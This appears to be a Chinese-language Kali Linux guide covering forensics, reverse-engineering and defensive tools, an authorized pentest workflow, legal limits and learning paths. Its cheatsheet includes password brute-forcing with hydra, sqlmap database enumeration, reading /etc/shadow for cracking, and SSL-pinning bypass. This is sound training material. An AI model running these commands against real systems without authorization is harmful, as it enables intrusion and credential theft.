数字取证的工作台：磁盘镜像解析、文件恢复、时间线、关键字搜索、报告导出，底层调用 Sleuth Kit。

autopsy
# 浏览器打开 http://127.0.0.1:9999/autopsy

坑：务必以只读方式挂载或直接对镜像操作；对原始磁盘写入会破坏证据链。

Sleuth Kit（fls / icat / mmls）

取证

文件系统取证的命令行基座：列分区、列已删除文件、按 inode 提取内容、生成时间线。

mmls disk.dd
fls -r -p disk.dd
icat disk.dd 128 > recovered.pdf
tsk_recover disk.dd out/

坑：删除文件能否恢复取决于文件系统和后续写入；先做镜像，别在原盘上操作。

Volatility 3

取证

内存取证框架：从内存镜像里找进程、网络连接、注入代码、注册表、口令哈希。

vol -f mem.raw windows.info
vol -f mem.raw windows.pslist
vol -f mem.raw windows.netscan

坑：符号表不对会全部失败；Win10/11 建议先 windows.info 确认版本，再选插件。

Binwalk

取证

扫描文件里的嵌入结构：固件里的 squashfs、压缩包、证书、可执行头，能直接提取。

binwalk -e firmware.bin
binwalk -Me firmware.bin

坑：-e 依赖 unsquashfs/sasquatch，缺工具时静默失败；签名误报很常见。

Foremost / Scalpel

取证

基于文件头尾签名的carving（雕复），从无文件系统的镜像里捞出图片、文档、压缩包。

foremost -t jpg,pdf,zip -i disk.dd -o out/
scalpel -c scalpel.conf disk.dd -o out/

坑：碎片化文件会残缺；输出体积可能远超镜像，预留空间。

bulk_extractor

取证

不做文件系统解析，直接从字节流里抽邮箱、URL、信用卡号、GPS 坐标，速度快、适合大镜像。

bulk_extractor -o out disk.dd

坑：抽取结果是"候选"，正则误报需要复核；不要把它当完整取证流程。

Guymager

取证

图形化磁盘镜像工具，支持 E01/AFF/DD，带哈希校验和进度，适合做可辩护的取证镜像。

sudo guymager

坑：镜像前后都要记录哈希；目标盘容量必须大于源盘已用空间。

dc3dd

取证

dcfldd 的继任者：带哈希、校验、进度、错误重试的 dd，做取证镜像比裸 dd 可靠。

dc3dd if=/dev/sdb of=disk.dd hash=sha256 log=image.log

坑：if/of 写反会直接毁掉目标盘；先 lsblk 三次确认设备名。

extundelete / ext4magic

取证

从 ext3/ext4 分区恢复被删文件，按 inode、目录或全盘恢复。

extundelete disk.dd --restore-all

坑：必须在只读副本上操作；原分区继续写入会覆盖被删数据块。

ExifTool

取证

读写几乎所有媒体文件的元数据：GPS、拍摄设备、软件版本、编辑历史，图片溯源的第一步。

exiftool photo.jpg
exiftool -a -G1 -s image.png

坑：社交平台会剥离 EXIF；改元数据会改变哈希，取证时先算哈希再操作副本。

Steghide / zsteg

取证

隐写检测与提取：steghide 处理 jpg/bmp/wav，zsteg 专攻 PNG，CTF 和恶意样本里都常见。

steghide extract -sf cover.jpg
zsteg -a image.png

坑：提取需要口令，暴力不可行；extract 前先 steghide info 看有没有嵌入数据。

oletools / pdf-parser

取证

分析 Office 宏和 PDF 里的恶意脚本：olevba 抽宏、pdf-parser 看对象和 JS，是样本初筛的标配。

olevba suspicious.docm
pdf-parser.py --search javascript invoice.pdf

坑：只做静态分析，别用办公软件打开样本；宏代码里常有混淆，olevba -c 能解一层。

rkhunter / chkrootkit

取证

主机完整性检查：可疑 SUID 文件、隐藏进程、被替换的系统命令、常见 rootkit 特征。

sudo rkhunter --check --sk
sudo chkrootkit

坑：误报非常多（尤其容器环境）；被入侵后攻击者可能已经改了这些工具本身。

radare2 / rizin

逆向

命令行逆向框架：反汇编、反编译、调试、打补丁，脚本化能力强，适合批量分析。

r2 -A ./binary
[0x00000000]> afl
[0x00000000]> pdf @ main

坑：命令体系陡峭，先记 aaa（分析）、afl（函数）、pdf（反汇编）、iz（字符串）。

Ghidra

逆向

NSA 开源的逆向平台，反编译质量接近商业工具，支持协作、脚本（Java/Python）和大量架构。

ghidra
# 无界面批量分析
analyzeHeadless /tmp/proj MyProj -import ./binary -postScript decompile.py

坑：首次启动要几 GB 堆内存；反编译结果变量名全是 local_xx，得自己改才有可读性。

GDB + GEF / pwndbg

逆向

Linux 原生调试器，配合 GEF/pwndbg 插件才有栈、堆、寄存器、漏洞利用辅助的可视化。

gdb -q ./vuln
(gdb) checksec
(gdb) pattern create 200
(gdb) run

坑：默认 GDB 很难用；插件要单独装，Kali 不会预装。PIE/ASLR 下地址每次不同。

objdump / readelf / nm

逆向

不用打开 GUI 就能看二进制：节表、符号、动态依赖、保护机制（NX/PIE/RELRO）。

readelf -h ./binary
readelf -l ./binary | grep -i gnu_stack
objdump -d -M intel ./binary | less

坑：strip 过的二进制没有符号，函数边界要靠启发式判断。

strace / ltrace

逆向

看程序到底向内核要了什么（文件、socket、进程）和调了哪些库函数，黑盒分析的第一层。

strace -f -s 200 ./binary
ltrace -f -S ./binary

坑：输出量巨大，先 -e trace=openat,connect 缩小范围；静态链接的程序 ltrace 看不到。

apktool

逆向

APK 解包与回编译：拿到 smali 代码、资源、AndroidManifest，改完能重新签名打包。

apktool d app.apk -o app_src
apktool b app_src -o patched.apk

坑：回编译后必须重新签名才能安装；新版 APK 有资源混淆，反编译可能直接失败。

jadx / jadx-gui

逆向

把 DEX 反编译成可读 Java 代码，比读 smali 快得多；GUI 支持交叉引用和搜索。

jadx -d out app.apk
jadx-gui app.apk

坑：混淆过的包类名全是 a.a.a；加固/加壳的 APK 只能看到壳的代码。

Frida

逆向

动态插桩：运行时 hook 函数、改返回值、绕过证书绑定和越狱检测，移动端分析的主力。

frida-ps -U
frida -U -f com.example.app -l hook.js --no-pause

坑：需要目标端有 frida-server 且与客户端版本一致；反调试会检测 27042 端口。

objection

逆向

基于 Frida 的移动端"开箱即用"工具集，ssl pinning 绕过、root 检测绕过、内存搜索都有现成命令。

objection -g com.example.app explore
com.example.app> android sslpinning disable

坑：只覆盖常见实现，自写校验要手动写 hook；iOS 需要越狱设备或重签名 IPA。

UPX

逆向

可执行文件压缩/加壳，也用来脱壳：-d 能还原大部分 UPX 壳的样本。

upx -d packed.exe -o unpacked.exe
upx -l packed.exe

坑：改过壳头或二次加壳的脱不掉；脱壳后要修导入表才能跑。

Cutter

逆向

radare2 的图形界面，拖进二进制就有反汇编图、函数列表和调试器，比纯命令行友好。

cutter ./binary

坑：大二进制分析很慢；内嵌的 r2 版本和系统 r2 可能不一致。

CherryTree

报告

树状笔记：按主机/服务/漏洞组织测试记录，支持代码块、截图、导出 PDF/HTML，离线可用。

cherrytree notes.ctb

坑：.ctb 是 SQLite，别放同步盘里并发写；重要项目定时导出备份。

Faraday

报告

协作式漏洞管理平台，能直接导入 nmap、Burp、Nuclei 的结果，统一去重、分级、出报告。

faraday-server
# 客户端 faraday-client 连接后导入扫描结果

坑：默认口令必须改；导入前先归一化，否则同一漏洞会出现十几条重复记录。

Dradis

报告

渗透报告协作框架：把工具输出导入成 issue 列表，套模板生成 Word/PDF 报告。

dradis
# 或 docker 部署，默认端口 3000

坑：免费版功能有限；模板改起来是 Ruby ERB，不熟就先别动。

CutyCapt

报告

无头浏览器截图，把漏洞页面、后台界面批量截成证据图，避免手抖漏截。

cutycapt --url=http://10.10.10.5/admin --out=evidence.png --max-wait=3000

坑：对 SPA 支持差，很多时候截到白屏；重要页面手工补图。

Metagoofil

报告

从公开网站批量下载文档并抽取元数据（作者、软件、路径、内网主机名），OSINT 报告常引用的证据来源。

metagoofil -d example.com -t pdf,docx,xlsx -l 20 -o docs/

坑：下载的是别人的文件，注意合规与保存期限；很多文档已被清洗过元数据。

asciinema

报告

录制终端会话成可回放的文本录像，复现步骤比截图可信，体积也小。

asciinema rec evidence.cast
asciinema play evidence.cast

坑：录像里可能有凭据和 token，交付前必须检查并脱敏。

Suricata

防守

IDS/IPS/NSM：规则匹配 + 协议解析 + 文件提取，能实时告警也能落 PCAP，是自建检测的起点。

sudo suricata -i eth0 -c /etc/suricata/suricata.yaml
sudo suricata-update

坑：规则不更新等于没有检测；误报要靠 threshold/suppress 调，不要直接关规则。

Zeek

防守

网络流量分析框架，把流量变成连接日志、DNS/HTTP/SSL 日志，配合脚本做行为检测。

zeek -i eth0 local
cat conn.log | zeek-cut id.orig_h id.resp_h duration

坑：日志量巨大，生产要配日志轮转和归档；不解析加密内容，只看元数据。

Arkime

防守

大规模 PCAP 索引与检索（原 Moloch），能全文搜会话、还原文件、做流量取证。

# Kali Purple 集成；单独部署见官方文档
sudo systemctl start arkimecapture

坑：吃磁盘，抓包前先算容量；索引和抓包节点要分开部署才稳。

Wazuh

防守

开源 HIDS/SIEM：文件完整性、日志分析、漏洞检测、合规基线，一套装完能看到主机层告警。

# 服务端 + agent，安装见 documentation.wazuh.com
sudo systemctl status wazuh-manager

坑：默认规则噪声大，先跑一周再调；agent 版本必须和服务端一致。

TheHive + Cortex

防守

事件响应工单系统 + 分析器引擎：把告警变成 case，自动跑 VirusTotal、MISP 等分析器。

# docker 部署，端口 9000（TheHive）/ 9001（Cortex）

坑：组件多（ES/Cassandra/MinIO），资源不够会一直起不来；先看官方 compose 示例。

MISP

防守

威胁情报共享平台：IOC 的结构化管理、关联、导出为 IDS 规则，团队情报协作的事实标准。

# Kali Purple 预置，或 docker 部署

坑：情报质量决定价值，别把未验证的 IOC 直接喂给检测设备。

Velociraptor

防守

端点可见性与取证：用 VQL 查询全网点进程、文件、注册表，做大规模应急排查。

velociraptor --config server.config.yaml frontend

坑：端点代理权限很高，部署前要有明确授权和审计；查询范围大时会拖慢终端。

CALDERA

防守

MITRE 的自动化对抗模拟：用 ATT&CK 战术编排"攻击"，验证检测规则到底有没有用。

python3 server.py --insecure
# 界面 https://127.0.0.1:8888

坑：它真的会执行攻击动作，只能在隔离的实验网段跑；agent 部署范围要严格控制。

没有匹配的工具。试试更短的关键词（如"扫描""哈希"），或点「全部」重置。

清单是"常用"而不是"全部"：Kali 仓库里还有 VoIP（sipvicious）、数据库（oscanner、mdbtools）、 社交工程（SET）、802.11 专项等上百个包，用 apt-cache search kali-tools- 能看到完整分类。

04 / WORKFLOW工具是按阶段用的，不是按热度用的

新手最常见的问题不是"不会用工具"，而是顺序错了：还没摸清资产就上扫描器，还没确认版本就找 PoC， 拿到 shell 就忘了记录。下面这条线是授权测试的标准骨架，每一步都有明确的产出物和停止条件。

01

定范围，拿到授权

把目标写成清单：域名、IP 段、App、接口、账号类型；写明时间窗、禁止动作、应急联系人。授权书没盖章之前，一行命令都不要跑。

产出：授权书 / 测试范围表 / 联系人 / 回滚方案

停止条件：范围里有你不确定归属的资产 → 先问，不要"顺手扫一下"。

02

被动侦察：先不碰目标

WHOIS、证书透明度、搜索引擎、公开代码仓库、招聘信息、历史泄露库。目标是画资产图，而不是发包。

whois · dig · theHarvester · amass -passive · crt.sh · GitHub 搜索

产出：子域/域名/IP 清单、技术栈猜测、员工与邮箱面（用于后续钓鱼演练授权范围）。

03

主动扫描与枚举

先确认存活，再扫端口，再识别服务版本，最后按服务做专项枚举（SMB、LDAP、SNMP、Web 目录）。这一步决定后面 80% 的方向。

masscan · nmap · netdiscover · enum4linux-ng · smbmap · gobuster/ffuf · whatweb

产出：每台主机的"端口 → 服务 → 版本 → 可用入口"表，原始输出全部落盘。

04

漏洞验证：能复现才算数

把版本号、配置、业务逻辑对到具体问题上，用最小代价证明"能造成什么影响"。扫描器报告只是线索，不是结论。

searchsploit · nuclei · nikto · Burp Repeater · sqlmap（低风险参数）· nmap --script vuln

产出：可复现的最小 PoC + 请求/响应原文 + 影响说明（能读到什么、能改什么）。

停止条件：验证动作可能影响业务（写库、删文件、重启服务）→ 先申请窗口。

05

利用、提权、横向

拿到初始访问后先稳（看清权限、网络位置、有没有 EDR），再提权、再找凭据、再横向。每一步都问：这一步在报告里怎么解释？

Metasploit · impacket · nxc · evil-winrm · linpeas/winPEAS · chisel/proxychains · BloodHound

产出：攻击路径图、每跳的凭据/漏洞依据、影响边界（到哪一层为止，没再往下）。

06

收尾：清理、复测、写报告

删除上传的 shell/账号/计划任务，恢复配置，记录所有变更；把发现按"可复现步骤 + 证据 + 修复建议 + 优先级"写成报告。

CherryTree/Faraday · asciinema · CutyCapt · 客户工单系统

产出：报告 + 证据包 + 清理清单（客户签字确认）+ 复测计划。

工作目录这样建，后面写报告能省一半时间

mkdir -p acme-2025/{00-scope,01-recon,02-scan,03-web,04-exploit,05-loot,06-report,99-tmp}
# 原始输出一律带时间戳和命令
nmap -sV -oA 02-scan/10.10.10.5_tcp 10.10.10.5
script -q 03-web/burp-session.log      # 终端会话留痕

# 证据文件先算哈希，交付时附在报告附录
sha256sum 05-loot/* > 05-loot/SHA256SUMS

一条容易被忽略的纪律：区分"事实"和"推测"

报告里"服务器返回了 Server: Apache/2.4.49"是事实；"因此存在路径穿越"是推测，需要一条实际请求来证明。 把这两类句子分开写，是渗透报告可信度的分水岭，也是甲方安全团队最在意的地方。

05 / CHEATSHEET命令速查：能直接改目标就跑

按场景分组。所有 IP、域名、文件名都是占位符；每个代码块右上角可以一键复制。 参数细节以 man 和工具当前版本为准，Kali 是滚动更新，个别参数会变。

系统与维护

# 更新（滚动发行，建议每周一次）
sudo apt update && sudo apt full-upgrade -y

# 全局设置：shell 提示符、元包、免密 sudo、Kali 主题
sudo kali-tweaks

# 看装了哪些分类工具
dpkg -l | grep kali-tools
apt-cache search kali-tools-

# 字典准备
sudo apt install seclists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Metasploit 数据库（首次初始化，或升级后报错时重来）
sudo msfdb reinit

主机与端口

# 存活发现（不依赖 ICMP）
sudo nmap -sn 192.168.56.0/24
sudo netdiscover -r 192.168.56.0/24

# 快速看常见端口，再全端口
sudo nmap -sS -sV --top-ports 1000 -T4 --min-rate 1000 10.10.10.5
sudo nmap -sS -p- -T4 --min-rate 2000 10.10.10.5 -oA full

# 服务专项
sudo nmap -sV -p 139,445 --script smb-enum-shares,smb-os-discovery 10.10.10.5
sudo nmap -sU -p 161 --script snmp-info 10.10.10.5
enum4linux-ng -A 10.10.10.5

Web

# 指纹与目录
whatweb -a 1 https://example.com
ffuf -u https://example.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,403 -fs 0

# 漏洞线索（先低风险）
nuclei -u https://example.com -severity high,critical -rl 50
nikto -h https://example.com -ssl

# SQL 注入：先确认，再取数据，最后才考虑 shell
sqlmap -u "https://example.com/item?id=1" --batch --level=2 --risk=1 --dbs
sqlmap -r req.txt -p id --batch --tables -D appdb

# 代理（Burp 在 8080，ZAP 在 8081）
curl -x http://127.0.0.1:8080 -k https://example.com/

口令与哈希

# 在线：先确认用户名存在，再小字典试，避免锁号
hydra -L users.txt -P pass.txt ssh://10.10.10.5 -t 4 -f
hydra -l admin -P pass.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# 离线：John 先自动识别格式，Hashcat 用 GPU
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -O

# 定制字典
cewl -d 2 -m 6 -w words.txt https://example.com

06 / PACKAGES元包：决定你装 200 个还是 600 个工具

Kali 不靠"一个大镜像装全部"，而是用元包（metapackage）分组。默认镜像只带 kali-linux-default 那一层， 剩下的大量工具在仓库里，用一条命令就能补上——也随时能卸掉。

元包包含什么什么时候装
kali-linux-core最小系统：内核、网络、基础命令做精简容器镜像、云端跳板
kali-linux-headless无桌面，含常用 CLI 工具与 SSH服务器/VPS 上做测试节点
kali-linux-default官方镜像里预装的那一套大多数人的起点
kali-linux-large默认 + 更多专项工具需要无线、硬件、逆向、取证工具时
kali-linux-everything仓库里全部工具，体积十几个 GB离线环境、教学机房、不想再装东西
kali-tools-top10官方挑选的十来个高频工具只想先上手，不想被清单淹没
kali-tools-web 等按分类：information-gathering、vulnerability-analysis、password-attacks、wireless、exploitation、sniffing-spoofing、post-exploitation、forensics、reverse-engineering、reporting-tools、hardware-hacking、social-engineering 等按需补一类，不污染系统
kali-desktop-xfce / -gnome / -kde桌面环境换桌面，或从 headless 装回图形界面

常用安装动作

# 只补 Web 这一类
sudo apt install kali-tools-web

# 大而全（先看磁盘）
df -h /
sudo apt install kali-linux-large

# 检查某个工具属于哪个元包
apt-cache show nmap | grep -i section
apt-cache rdepends --installed kali-tools-web

国内镜像（可选）

官方源在国外，更新慢时换镜像。写进 /etc/apt/sources.list 前先备份，且不要同时混用多个发行版的源。

sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak

deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free non-free-firmware
# 或 mirrors.ustc.edu.cn / mirrors.aliyun.com

sudo apt update

升级之后工具坏了，按这个顺序修

  1. 先看是谁坏了：apt list --upgradable、dpkg -l | grep -v ^ii，找出半装的包。
  2. 补依赖：sudo apt --fix-broken install，再 sudo dpkg --configure -a。
  3. 重装单个工具：sudo apt install --reinstall nmap，比整机重装省事得多。
  4. Metasploit 起不来：sudo msfdb reinit，再检查 systemctl status postgresql。
  5. 驱动/桌面挂了：回滚到升级前的快照。这就是为什么第 2 节强调先拍快照。

维护节奏建议：每周 apt update + 看一次 kali.org/blog；大版本工具升级（如 Metasploit、Burp）前拍快照； 客户项目期间不要随手 full-upgrade，环境变了复现结果就不可信了。

07 / LEGAL LINE授权不是形式，是唯一的合法性来源

这一段比上面所有工具都重要。技术失误可以重来，法律问题不行。 下面只做常识性说明，具体案件以司法机关认定和专业律师意见为准。

依据管什么和你的关系
《刑法》第 285 条第 1 款非法侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统行为犯，进入即可能构罪，不看是否造成损失
《刑法》第 285 条第 2 款非法获取计算机信息系统数据、非法控制计算机信息系统（情节严重）拖库、拿 shell、留后门最常落到这一条
《刑法》第 285 条第 3 款提供侵入、非法控制计算机信息系统的程序、工具写/卖"一键渗透"工具也可能担责，不只是使用者
《刑法》第 286 条破坏计算机信息系统，后果严重扫描把服务打挂、删数据、改配置都可能踩到
《网络安全法》第 27 条禁止非法侵入他人网络、干扰正常功能、窃取数据；禁止提供专门工具；禁止明知而提供支持行政处罚层面的直接依据，覆盖"未达刑事标准"的行为
《数据安全法》《个人信息保护法》数据处理与个人信息处理的合法性、最小必要、安全义务测试中接触到的数据同样受管，不能随便留存或外传

"我只是扫了一下端口""我没拿数据"不是免责理由：未授权扫描本身就可能构成对他人网络正常功能的干扰， 而"是否获利"影响的往往只是量刑，不是定性。

一份能保护你的授权书，至少写清六件事

必须写进去

  • 主体：委托方全称、盖章、签署日期、有效期
  • 范围：精确到域名、IP/CIDR、App 包名、账号类型；"相关系统"这种措辞等于没写
  • 时间窗：允许测试的具体时段（含时区）
  • 禁止动作：DoS、社工、物理入侵、数据外带、影响生产的写入
  • 应急联系人：出事时打给谁、多久内响应
  • 数据条款：加密存储、谁能访问、项目结束多久销毁、是否可留存截图

这些做法会把你送进去

  • 用公司/学校网络扫外网，或"顺手"扫同网段的其他主机
  • 拿真实客户、真实学校、真实医院当练手目标
  • 测自家 WiFi 之外的热点，"就试一下"
  • 把客户数据拷回本机"做分析"，项目结束也不删
  • 在生产环境跑 sqlmap --dump-all、--os-shell
  • 把未修复漏洞、凭据、内网拓扑发到群里或写成公众号文章

08 / LEARNING PATH三条路线，别从"工具大全"开始背

工具会过时，方法不会。下面三条路线的前两周是重合的（Linux + 网络 + 一门脚本语言）， 之后按你的目标分叉。时间按每天 1–2 小时估算，全职学习可以压缩到一半。

第 1–2 周：地基

Linux 命令行（权限、进程、网络、日志）、TCP/IP 与 HTTP 基础、Python 能读能改。别急着开 Burp，先把 ss -tulpn、find、grep、curl 用熟。

第 3 周：侦察与枚举

nmap 的参数逻辑（为什么 -sS 要 root、-Pn 解决什么）、目录爆破的字典选择、SMB/LDAP 枚举。目标是看到端口就知道下一步查什么。

第 4–5 周：Web

Burp 代理与 Repeater、SQL 注入（手工判断 + sqlmap 验证）、文件上传/包含、越权与逻辑漏洞。配合 PortSwigger Academy 的实验，一天两个。

第 6–8 周：系统渗透

Metasploit 的模块逻辑、Linux/Windows 提权检查清单、凭据复用。打 3–5 台 HTB Easy 机器，每台都写一份带时间线的报告。

第 9–12 周：内网与考试准备

Active Directory 基础、BloodHound、横向与隧道。如果目标是 OSCP，按 PEN-200 的章节走，并做完整 24 小时模拟考。

认证参考：OSCP（PEN-200）是业界最认的实操认证；OSWP 偏无线；OSWE 偏 Web 代码审计。国内可看 CISP-PTE 等，但含金量与用途不同，按雇主要求选。

第 1–2 周：先学会看流量

Wireshark 过滤器、TCP 三次握手与 TLS 握手、DNS/HTTP 日志长什么样。防守方的核心能力是"从噪声里分辨异常"，不是"会背规则"。

第 3–4 周：检测栈

Suricata 规则语法与 suricata-update、Zeek 日志字段、Sigma 规则思路。搭一套最小环境：一台靶机 + 一台 Suricata + 一个查看日志的界面。

第 5–6 周：主机与身份

Wazuh/OSSEC 的 FIM 与日志采集、Windows 事件日志关键 ID（4624/4625/4688/7045）、Linux auditd。学会写一条能落地的检测规则。

第 7–8 周：对抗验证

用 CALDERA / Atomic Red Team 按 ATT&CK 跑一遍，看自己的规则命不命中。这一步能把"纸面检测"变成"有效检测"。

第 9–12 周：SOC 流程

TheHive 工单、MISP 情报、告警分级与误报治理。Kali Purple 适合做这个阶段的实验平台。

认证参考：蓝队方向更看平台经验（Splunk/Elastic/Chronicle）与事件复盘数量，认证（如 GCIA、蓝队相关厂商认证）是加分项而非门槛。

第 1–2 周：证据链意识

只读、哈希、时间线、保管链（chain of custody）。先学 dc3dd + sha256sum + 记录表，再学工具。

第 3–4 周：磁盘与文件系统

Sleuth Kit 的 mmls/fls/icat、Autopsy 的时间线视图、文件雕复（foremost）。拿一个旧 U 盘做练习目标。

第 5–6 周：内存与日志

Volatility 3 的进程/网络/注入插件、Windows 事件日志与 $MFT、Linux journal。学会把"进程 → 网络连接 → 文件"串起来。

第 7–8 周：恶意样本初筛

静态：strings、oletools、pdf-parser、YARA；动态：隔离虚拟机 + Procmon/strace。永远不要在宿主机上双击样本。

第 9–12 周：完整案件演练

用一个公开取证镜像（如 DFIR 训练集）做完整流程：接案 → 镜像 → 分析 → 时间线 → 报告 → 复盘。

认证参考：GCFE/GCFA（SANS）、ACE（AccessData）等；国内电子数据取证相关资质也有对应体系。

09 / PITFALLS十个高频坑，都是真实浪费时间的那种

这些问题在论坛和群里每天都会出现。提前知道，能省掉很多"是不是我装错了"的自我怀疑。

1. 密码不对：kali/kali 只适用于预构建镜像

官方 VM/容器镜像默认是 kali/kali；用 Installer ISO 自己装的系统，密码是安装时设的。 忘了密码就进 recovery mode 改，或者在 GRUB 里加 init=/bin/bash 后 passwd。

2. john 报找不到 rockyou.txt

Kali 里它是压缩的：sudo gunzip /usr/share/wordlists/rockyou.txt.gz。 顺便，seclists 不在默认镜像里，要 sudo apt install seclists。

3. 无线网卡切不了监听模式

先确认芯片支持 monitor + injection（AR9271、RT3070、RTL8812AU 常见，Intel 内置网卡基本不行）。 虚拟机上还要把 USB 网卡直通给 Kali。airmon-ng 之后用 iw dev 看接口名是不是变了。

4. 虚拟机里 hashcat 慢得离谱

没有 GPU 直通时只能用 CPU，速度差几十倍。要么实体机跑，要么用支持 PCIe 直通的宿主（Linux + VFIO）， 要么干脆把哈希拿出去在别的机器上跑——注意数据合规。

5. nmap 报 "requires root privileges"

-sS（SYN 扫描）需要 raw socket。加 sudo，或者改用 -sT。 在 WSL/容器里即使 root 也可能行为异常，扫描结果要和真机对照。

6. DNS 突然不通 / resolv.conf 被改回去

NetworkManager 会覆盖 /etc/resolv.conf。用 nmcli 改连接配置，或把文件设为不可变（chattr +i，记得改回来）， 别直接手写文件然后纳闷为什么重启就丢。

7. Kerberos / 域相关工具全部时间错误

域环境要求时间偏差在 5 分钟内。虚拟机休眠后时间会飘，sudo ntpdate dc.corp.local 或配置 chrony 指向域控，再跑 impacket 那套工具。

8. 教程里的命令不存在了（改名/移除）

典型：CrackMapExec → NetExec（nxc）、部分 Python 2 工具被移除、sslstrip 已废弃。 遇到 command not found，先 apt search 关键词，再看工具官网的迁移说明。

9. apt upgrade 之后桌面/网络挂了

滚动发行偶尔会遇到依赖冲突或驱动不兼容。正确姿势：升级前拍快照；挂了就回滚，然后只重装有问题的包 （sudo apt install --reinstall 包名）。不要在没有快照的情况下 full-upgrade。

10. WSL 里工具"能装不能用"

WSL2 没有无线、raw socket 受限、无 systemd（新版可开）、GUI 需要 WSLg。它适合跑 sqlmap/ffuf/impacket 这类用户态工具， 不适合做嗅探、无线、依赖内核模块的事情。要完整能力还是虚拟机或实体机。

11. 扫描把目标打挂了，或者自己被封了

并发和速率是最常见的肇事原因：ffuf 默认 40 线程、nuclei 默认高并发、masscan 默认速率就很猛。 对生产系统先 -t 5/-rl 20，观察响应时间再逐步加。被封 IP 后换源也未必有用，先降速。

12. 忘了记录，报告写不出来

所有命令用 -oA/-o 落盘，终端用 script 或 asciinema 录， 发现漏洞立刻存请求响应原文。当天整理，隔天记忆就会漏掉关键一步。
